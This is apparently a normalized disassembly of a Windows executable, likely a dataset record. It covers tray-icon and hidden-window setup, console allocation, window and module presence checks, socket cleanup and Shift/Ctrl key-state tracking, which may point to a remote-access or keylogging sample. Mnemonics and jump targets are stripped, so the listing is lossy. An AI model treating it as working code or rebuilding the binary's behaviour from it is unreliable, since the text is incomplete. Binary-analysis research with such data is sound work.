call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x24 ]
push eax
call sub_40efb5
add esp 0x24
lea ecx [ ebp - 0x24 ]
xor edi edi
call sub_4012b5
test eax eax
jbe r-xdata
lea ecx [ ebp - 0x24 ]
call sub_401b3c
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor esi esi
cmp [ ebp + 0x18 ] 0x0
je r-xdata
inc edi
lea ecx [ ebp - 0x24 ]
movzx esi di
call sub_4012b5
cmp esi eax
jb r-xdata
lea ecx [ ebp - 0x24 ]
call sub_401b3c
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al 0x1
jmp r-xdata
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov edi eax
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi [ ebp + 0x18 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push 0x0
push esi
lea ecx [ ebp - 0x24 ]
call sub_401289
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp eax [ ecx ]
jne r-xdata
pop edi
pop esi
leave
retn
sub_40f5ef
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
push 0x0
mov ecx edi
mov al [ edi ]
mov [ esi ] al
call sub_4012b5
push eax
mov ecx esi
call sub_401bb5
push eax
mov ecx edi
mov [ esi + 0x4 ] eax
call sub_408637
push eax
mov ecx edi
call sub_408633
push eax
mov ecx esi
call sub_40863b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov eax esi
pop edi
pop esi
pop ebp
retn 0x4
sub_40f652
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
call sub_408633
push [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
sub esi eax
mov ecx edi
push 0x1
push [ ebp + 0x8 ]
sar esi 0x4
call sub_40f687
mov ecx edi
call sub_408633
shl esi 0x4
add eax esi
pop edi
pop esi
pop ebp
retn 0x8
sub_40f687
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi ecx
push edi
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0xc ]
sub ecx eax
sar ecx 0x4
cmp ecx ebx
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov edx eax
sub edx ecx
sar edx 0x4
cmp edx ebx
jae r-xdata
mov ecx esi
call sub_4012b5
cmp ebx eax
jae r-xdata
test ebx ebx
jbe r-xdata
mov edi ebx
shl edi 0x4
lea edx [ edi + ecx ]
push edx
push eax
push ecx
mov ecx esi
call sub_40863b
mov eax [ esi + 0x8 ]
push [ ebp + 0x10 ]
mov ecx eax
sub ecx [ ebp + 0x8 ]
sar ecx 0x4
sub ebx ecx
mov ecx esi
push ebx
push eax
call sub_401b8d
push [ ebp + 0x10 ]
push [ esi + 0x8 ]
push [ ebp + 0x8 ]
call sub_40f7fe
add esp 0xc
add [ esi + 0x8 ] edi
jmp r-xdata
mov [ ebp + 0xc ] ebx
mov ecx esi
call sub_4012b5
mov [ ebp + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
shl ebx 0x4
push eax
push eax
sub eax ebx
mov ecx esi
push eax
call sub_40863b
mov eax [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
push eax
sub eax ebx
push eax
push edi
call sub_40f81d
push [ ebp + 0x10 ]
lea eax [ ebx + edi ]
push eax
push edi
call sub_40f7fe
add esp 0x18
add [ esi + 0x8 ] ebx
mov ecx esi
call sub_4012b5
mov edi eax
push 0x0
add edi [ ebp + 0xc ]
mov ecx esi
push edi
call sub_401bb5
push eax
mov ecx esi
push [ ebp + 0x8 ]
mov [ ebp + 0xc ] eax
push [ esi + 0x4 ]
call sub_40863b
push [ ebp + 0x10 ]
mov ecx esi
mov [ ebp - 0x4 ] eax
push ebx
push eax
call sub_401b8d
mov eax ebx
mov ecx esi
shl eax 0x4
add eax [ ebp - 0x4 ]
push eax
push [ esi + 0x8 ]
push [ ebp + 0x8 ]
call sub_40863b
push [ esi + 0x8 ]
mov ecx esi
push [ esi + 0x4 ]
call sub_401b6b
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0xc ]
sub ecx eax
sar ecx 0x4
push ecx
push eax
mov ecx esi
call sub_403626
shl edi 0x4
add edi [ ebp + 0xc ]
mov ecx esi
mov [ esi + 0xc ] edi
call sub_4012b5
mov ecx eax
mov eax [ ebp + 0xc ]
add ecx ebx
mov [ esi + 0x4 ] eax
shl ecx 0x4
add ecx eax
mov [ esi + 0x8 ] ecx
jmp r-xdata
sub_40f7e0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
pop ebp
retn
mov edx [ ebp + 0x10 ]
mov cl [ eax ]
inc [ ebp + 0x10 ]
inc eax
mov [ edx ] cl
inc eax
jmp r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
sub_40f7fe
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x10 ]
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
add esi 0x10
jmp r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
sub_40f81d
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
cmp [ ebp + 0x8 ] esi
je r-xdata
mov eax [ ebp + 0x10 ]
pop esi
pop ebp
retn
sub [ ebp + 0x10 ] 0x10
sub esi 0x10
mov ecx [ ebp + 0x10 ]
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
cmp esi [ ebp + 0x8 ]
jne r-xdata
sub_40f8bf
push ebp
mov ebp esp
sub esp 0x120
push esi
push edi
lea eax [ ebp - 0x120 ]
push 0x104
xor esi esi
push eax
push esi
call [ GetModuleFileNameA@IAT ]
call sub_40f978
mov [ rw-data ] eax
lea eax [ ebp - 0x120 ]
push esi
push eax
push esi
mov [ rw-data ] 0x58
mov [ rw-data ] 0x1
mov [ rw-data ] 0x401
call [ ExtractIconA@IAT ]
push 0x40
mov [ rw-data ] eax
push [ rw-data ]
push rw-data
call [ lstrcpynA@IAT ]
push rw-data
push esi
mov [ rw-data ] 0x7
call [ Shell_NotifyIconA@IAT ]
mov edi [ GetMessageA@IAT ]
push esi
push esi
lea eax [ ebp - 0x1c ]
push esi
push eax
pop edi
pop esi
leave
retn
lea eax [ ebp - 0x1c ]
push eax
call [ TranslateMessage@IAT ]
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageA@IAT ]
push esi
push esi
lea eax [ ebp - 0x1c ]
push esi
push eax
jmp r-xdata
call edi
test eax eax
je r-xdata
sub_40f978
push ebp
mov ebp esp
sub esp 0x40
push esi
push edi
push 0xb
xor eax eax
pop ecx
lea edi [ ebp - 0x3c ]
[ edi ]
mov esi r--data
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x40 ] 0x30
movsb [ edi ] [ esi ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x40 ]
xor esi esi
push eax
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x38 ] sub_40f9ef
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x1c ] esi
call [ RegisterClassExA@IAT ]
test ax ax
je r-xdata
xor eax eax
push esi
push esi
push esi
push 0xfffffffd
push esi
push esi
push esi
push esi
push esi
lea eax [ ebp - 0x10 ]
push esi
push eax
push esi
call [ CreateWindowExA@IAT ]
cmp eax esi
jne r-xdata
pop edi
pop esi
leave
retn
call [ GetLastError@IAT ]
sub_40f9ef
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
dec eax
je r-xdata
call [ CreatePopupMenu@IAT ]
push r--data
push 0x0
push 0x0
push eax
mov [ rw-data ] eax
call [ AppendMenuA@IAT ]
sub eax 0x110
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
sub eax 0x2f0
je r-xdata
xor eax eax
push rw-data
push 0x2
call [ Shell_NotifyIconA@IAT ]
push 0x0
call [ ExitProcess@IAT ]
mov eax [ ebp + 0x14 ]
sub eax 0x201
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ rw-data ]
call [ IsWindowVisible@IAT ]
test eax eax
je r-xdata
sub eax 0x3
je r-xdata
leave
retn 0x10
push 0x9
push [ rw-data ]
call [ ShowWindow@IAT ]
push [ rw-data ]
call [ SetForegroundWindow@IAT ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ ShowWindow@IAT ]
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
call [ GetCursorPos@IAT ]
push [ ebp + 0x8 ]
call [ SetForegroundWindow@IAT ]
push 0x0
push [ ebp + 0x8 ]
push 0x0
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push 0x0
push [ rw-data ]
call [ TrackPopupMenu@IAT ]
jmp r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x401
jmp r-xdata
push [ ebp + 0x8 ]
call [ DefWindowProcA@IAT ]
jmp r-xdata
sub_40faed
push ebp
mov ebp esp
sub esp 0x3e8
push ebx
push esi
push edi
call [ AllocConsole@IAT ]
call [ rw-data ]
xor ebx ebx
mov [ rw-data ] eax
cmp [ ebp + 0x8 ] bl
jne r-xdata
mov eax [ _iob@IAT ]
add eax 0x20
push eax
push r--data
push r--data
call [ freopen@IAT ]
mov ecx 0xf9
xor eax eax
lea edi [ ebp - 0x3e7 ]
mov [ ebp - 0x3e8 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
or edx 0xffffffff
mov edi r--data
mov ecx edx
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea ebx [ ebp - 0x3e8 ]
mov eax ecx
mov esi edi
mov edi ebx
lea ebx [ ebp - 0x3e8 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi r--data
mov ecx edx
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi ebx
mov ebx ecx
mov ecx edx
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea ebx [ ebp - 0x3e8 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi r--data
mov ecx edx
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi ebx
mov ebx ecx
mov ecx edx
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ ebp - 0x3e8 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ printf@IAT ]
add esp 0x10
pop edi
pop esi
pop ebx
leave
retn
push ebx
push eax
call [ ShowWindow@IAT ]
sub_40fcf0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_40fd20
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_40ff13
cmp [ rw-data ] ebx
jne r-xdata
call sub_40fefe
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_40ff10
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_407452
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_4010f1
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
setne al
retn
sub_401157
push 0x1
pop eax
retn
sub_4011d2
push 0x0
push r--data
call [ FindWindowA@IAT ]
test eax eax
setne al
retn
sub_4011e5
push 0x0
push r--data
call [ FindWindowA@IAT ]
test eax eax
setne al
retn
sub_401305
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_401326
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_401331
call sub_40133b
jmp sub_401350
sub_40133b
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_401350
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40135c
call sub_40fcba
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40135c
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
j_sub_40136c
jmp sub_40136c
sub_40136c
push 0x40
call ??2@YAPAXI@Z
pop ecx
mov [ rw-data ] eax
retn
sub_40137a
call sub_401384
jmp sub_4013b3
sub_4013b3
push sub_4013bf
call sub_40fcba
pop ecx
retn
sub_4013bf
mov ecx rw-data
jmp sub_401b3c
sub_401bb5
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_401bec
pop ecx
pop ecx
pop ebp
retn 0x8
sub_401bc8
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401c04
pop ecx
pop ecx
pop ebp
retn 0x8
sub_401bdc
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_401c2c
pop ecx
pop ebp
retn 0x4
sub_401bec
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jge r-xdata
shl eax 0x4
push eax
call ??2@YAPAXI@Z
pop ecx
pop ebp
retn
xor eax eax
sub_401c24
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
pop ebp
retn
sub_401c2c
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push 0x0
call sub_401c3b
pop ebp
retn
sub_401c5b
call sub_401c65
jmp sub_401c7a
sub_401c65
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_401c7a
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_401c86
call sub_40fcba
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_401c86
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_401c91
call sub_401c9b
jmp sub_401ca8
sub_401c9b
push 0x0
mov ecx rw-data
call sub_4020e1
retn
sub_401ca8
push sub_401cb4
call sub_40fcba
pop ecx
retn
sub_401cb4
mov ecx rw-data
jmp sub_4021d6
sub_402063
mov eax r-xdata
retn
sub_402069
call sub_402073
jmp sub_402085
sub_402073
push r--data
push rw-data
call sub_40ef4b
pop ecx
pop ecx
retn
sub_402085
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_402091
call sub_40fcba
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_402091
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_40209c
call sub_4020a6
jmp sub_4020bb
sub_4020a6
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_4020bb
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_4020c7
call sub_40fcba
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_4020c7
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4020d2
jmp r-xdata
mov ecx rw-data
jmp sub_402903
sub_4021d6
push esi
mov esi ecx
push [ esi ]
call closesocket
lea ecx [ esi + 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop esi
retn
sub_40220a
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push 0x0
push [ ecx + 0x14 ]
call sub_40221c
pop ebp
retn
sub_4022e6
mov al [ ecx + 0x34 ]
retn
sub_402823
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_402832
pop ebp
retn 0x4
sub_4028eb
push ebp
mov ebp esp
push esi
mov esi ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_402906
mov eax esi
pop esi
pop ebp
retn 0x8
sub_402903
mov eax ecx
retn
sub_402c11
call sub_402c1b
jmp sub_402c2f
sub_402c1b
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call sub_403507
leave
retn
sub_402c2f
push sub_402c3b
call sub_40fcba
pop ecx
retn
sub_402c3b
mov ecx rw-data
jmp sub_403522
sub_4034ee
mov eax r-xdata
retn
sub_403507
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov cl [ ecx ]
mov [ eax ] cl
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
pop ebp
retn 0x4
sub_403626
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40fc2c
pop ecx
pop ebp
retn 0x8
sub_403636
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_403696
pop ecx
pop ebp
retn 0x4
sub_403696
retn
sub_403697
call sub_4036a1
jmp sub_4036ab
sub_4036a1
mov ecx rw-data
jmp sub_4036f3
sub_4036ab
push sub_4036b7
call sub_40fcba
pop ecx
retn
sub_4036b7
mov ecx rw-data
jmp sub_4036c1
sub_40380c
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_403877
pop ebp
retn 0x4
sub_40381b
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_403988
sub_40382c
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_403ae3
pop ebp
retn 0x4
sub_40383b
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_404077
pop ebp
retn 0x4
sub_40384a
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_4042aa
sub_40385c
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ rw-data ]
call sub_4038db
pop ebp
retn 0xc
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4050b4
mov eax [ ecx + 0x3c ]
sub eax 0xa0
je r-xdata
mov [ ecx + 0x2d ] 0x1
dec eax
jne r-xdata
retn
sub_4050c6
mov eax [ ecx + 0x3c ]
sub eax 0xa0
je r-xdata
and [ ecx + 0x2d ] 0x0
dec eax
jne r-xdata
retn
sub_4050d8
mov eax [ ecx + 0x3c ]
sub eax 0xa2
je r-xdata
mov [ ecx + 0x2e ] 0x1
dec eax
jne r-xdata
retn
sub_4050ea
mov eax [ ecx + 0x3c ]
sub eax 0xa2
je r-xdata
and [ ecx + 0x2e ] 0x0
dec eax
jne r-xdata
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_405201
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_405ff2
call sub_405ffc
jmp sub_406009
sub_405ffc
push 0x0
mov ecx rw-data
call sub_4020e1
retn
sub_406009
push sub_406015
call sub_40fcba
pop ecx
retn
sub_406015
mov ecx rw-data
jmp sub_4021d6
sub_40601f
call sub_406029
jmp sub_40603e
sub_406029
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_40603e
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40604a
call sub_40fcba
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40604a
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_406261
call sub_40626b
jmp sub_406280
sub_40626b
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_406280
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40628c
call sub_40fcba
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40628c
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_406297
call sub_4062a1
jmp sub_4062b6
sub_4062a1
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_4062b6
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_4062c2
call sub_40fcba
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_4062c2
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4062cd
call sub_4062d7
jmp sub_4062ec
sub_4062d7
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_4062ec
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_4062f8
call sub_40fcba
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_4062f8
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_406303
call sub_40630d
jmp sub_406322
sub_40630d
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_406322
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40632e
call sub_40fcba
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40632e
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_407346
call sub_407350
jmp sub_407364
sub_407350
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call sub_403507
leave
retn
sub_407364
push sub_407370
call sub_40fcba
pop ecx
retn
sub_407370
mov ecx rw-data
jmp sub_401b3c
sub_40737a
call sub_407384
jmp sub_407399
sub_407384
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_407399
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_4073a5
call sub_40fcba
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_4073a5
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4073b0
call sub_4073ba
jmp sub_4073cf
sub_4073ba
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_4073cf
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_4073db
call sub_40fcba
pop ecx
retn
